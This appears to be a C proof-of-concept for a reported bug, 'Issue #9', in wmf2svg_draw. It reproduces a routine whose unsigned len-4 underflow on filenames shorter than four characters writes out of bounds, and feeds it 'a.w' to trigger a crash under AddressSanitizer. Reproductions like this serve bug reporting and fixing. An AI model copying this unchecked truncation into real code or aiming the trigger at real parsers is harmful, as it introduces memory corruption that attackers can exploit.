/*
 * POC for Issue #9: wmf2svg_draw Filename Buffer Overflow
 * CRASH VERSION - Will trigger ASAN
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char* wmf_filename;
} PlotData;

void wmf2svg_draw_vulnerable(PlotData* pdata) {
    char* prefix;
    size_t len;

    printf("[*] Input filename: '%s'\n", pdata->wmf_filename);
    len = strlen(pdata->wmf_filename);
    printf("[*] Filename length: %zu\n", len);

    prefix = (char*)malloc(len + 1);
    if (!prefix) {
        printf("[-] Allocation failed\n");
        return;
    }

    printf("[+] Allocated buffer: %p - %p (%zu bytes)\n",
           (void*)prefix, (void*)(prefix + len + 1), len + 1);

    strcpy(prefix, pdata->wmf_filename);
    printf("[+] Copied filename to buffer\n");

    printf("\n[*] Attempting to truncate extension (len - 4)...\n");

    if (len < 4) {
        printf("[!] VULNERABILITY TRIGGERED!\n");
        printf("[!] len=%zu, len-4=%zu (unsigned wraparound!)\n",
               len, len - 4);
        printf("[!] This will write to prefix[%zu]\n", len - 4);
        printf("[!] Buffer is only %zu bytes - MASSIVE OVERFLOW!\n\n", len + 1);

        // *** CRASH TRIGGER - UNCOMMENTED ***
        printf("[!] Writing to out-of-bounds address...\n");
        prefix[len - 4] = '\0';  // This will crash!
        printf("[!] If you see this, something is wrong!\n");
    } else {
        printf("[+] Safe: len >= 4, truncating at position %zu\n", len - 4);
        prefix[len - 4] = '\0';
        printf("[+] Result: '%s'\n", prefix);
    }

    free(prefix);
}

int main() {
    printf("[*] POC for Issue #9: wmf2svg_draw Filename Buffer Overflow\n");
    printf("[*] CRASH VERSION - Will trigger ASAN\n\n");

    PlotData pdata;

    // Test with short filename to trigger vulnerability
    printf("=== Test: Short filename (3 chars) ===\n");
    pdata.wmf_filename = "a.w";
    wmf2svg_draw_vulnerable(&pdata);

    printf("\n[!] ERROR: Should have crashed but didn't!\n");
    return 0;
}
